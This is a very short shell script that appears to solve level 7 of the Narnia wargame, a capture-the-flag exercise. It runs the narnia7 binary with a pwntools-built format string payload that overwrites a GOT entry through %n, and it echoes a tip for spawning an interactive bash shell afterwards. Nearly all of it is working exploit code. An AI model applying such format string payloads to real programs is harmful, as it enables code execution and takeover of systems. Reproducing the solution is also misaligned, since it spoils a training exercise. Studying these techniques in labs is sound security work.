echo "Simple GOT overwrite with format string vulnerability"
echo "Run after shell: python -c 'import pty; pty.spawn("/bin/bash")'"
./narnia7 `python -c 'from pwn import *; print(p32((0x8049b68)) + "%" + str(0x08048724) + "d" + "%2$n.")'`
